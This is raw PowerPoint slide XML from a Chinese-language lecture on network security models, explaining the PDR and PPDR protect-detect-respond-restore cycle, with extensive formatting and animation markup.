              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>）、恢复（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Restore</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>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的有机结合。该模型强调的是自动故障恢复能力。</a:t>
            </a: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3801" y="2420888"/>
            <a:ext cx="3397889" cy="2962249"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="矩形 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="755576" y="2418298"/>
            <a:ext cx="2822848" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>保护（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Protect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>）作为基础，将保护视为活动过程</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="矩形 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5396649" y="2741464"/>
            <a:ext cx="3240590" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>采用检测（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Detect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>）手段来发现安全漏洞</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="矩形 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5309430" y="4653136"/>
            <a:ext cx="3327809" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>采用应急响应（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>React</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>）措施对付各种入侵</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="矩形 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="623578" y="4182808"/>
            <a:ext cx="2507176" cy="1200329"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>在系统被入侵后，要采取相应的措施将系统恢复（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Restore</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>）到正常状态。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42355078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down)">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down)">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down)">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down)">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81000" y="692696"/>
            <a:ext cx="3775393" cy="523220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>PDR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>演变</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>： </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>PPDR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>模型</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="矩形 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="433636" y="4451576"/>
            <a:ext cx="8352928" cy="1200329"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>PPDR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>的基于思想是：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>在整体的安全策略的控制和指导下，综合运用防护工具（如防火墙、身份鉴别、加密等）的同时，利用检测工具（如漏洞评估、入侵检测系统）了解和评估系统的安全状态，通过适当的响应将系统调整到一个比较安全的状态。保护、检测和响应组成了一个完整的、动态的安全循环。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="9" name="Object 5"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noChangeAspect="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2322880015"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1475656" y="1556792"/>
          <a:ext cx="5233756" cy="2755308"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/presentationml/2006/ole">
            <mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">
              <mc:Choice xmlns:v="urn:schemas-microsoft-com:vml" Requires="v">
                <p:oleObj r:id="rId2" imgW="4485704" imgH="4244264" progId="">
                  <p:embed/>
                </p:oleObj>
              </mc:Choice>
              <mc:Fallback>
                <p:oleObj r:id="rId2" imgW="4485704" imgH="4244264"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1556792"/>
                        <a:ext cx="5233756" cy="2755308"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                      <a:noFill/>
                    </p:spPr>
                  </p:pic>
                </p:oleObj>
              </mc:Fallback>
            </mc:AlternateContent>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33682363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4784"/>
            <a:ext cx="9144000" cy="4651970"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="矩形 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="381000" y="692696"/>
            <a:ext cx="4857420" cy="523220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>PDR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>演变</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>： 这也是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>PPDR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>模型</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1801654557"/>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body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560" y="1484784"/>
            <a:ext cx="8191500" cy="2304256"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>PDR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>模型强调落实反应</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>PPDR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>模型则更强调控制和对抗，即强调系统安全的动态性</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>以安全检测、漏洞监测和自适应填充</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>安全间隙</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>为循环来提高网络安全</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>特别考虑人为的管理因素</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="75779" name="标题 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="746772" y="761026"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PPDR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>模型</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>分布式动态主动模型</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="75781" name="Object 5"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noChangeAspect="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="345223035"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1176056" y="3861048"/>
          <a:ext cx="2405920" cy="2280171"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/presentationml/2006/ole">
            <mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">
              <mc:Choice xmlns:v="urn:schemas-microsoft-com:vml" Requires="v">
                <p:oleObj r:id="rId2" imgW="4485704" imgH="4244264" progId="">
                  <p:embed/>
                </p:oleObj>
              </mc:Choice>
              <mc:Fallback>
                <p:oleObj r:id="rId2" imgW="4485704" imgH="4244264"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6056" y="3861048"/>
                        <a:ext cx="2405920" cy="22801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23" descr="j029202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27910" y="3789040"/>
            <a:ext cx="2020806" cy="214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utoShape 26"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="10800000">
            <a:off x="2817974" y="4509120"/>
            <a:ext cx="2409936" cy="93503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C99FF">
              <a:alpha val="7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35871122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778">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7577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77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778">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7577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77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5778">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7577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77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5778">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7577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577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5781"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="31" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="75781"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="32" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="75781"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="33" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7578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1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="6"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="37" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="6"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="38" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="6"/>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1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="42" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="4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build="p"/>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type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533400" y="1295400"/>
            <a:ext cx="8191500" cy="796079"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
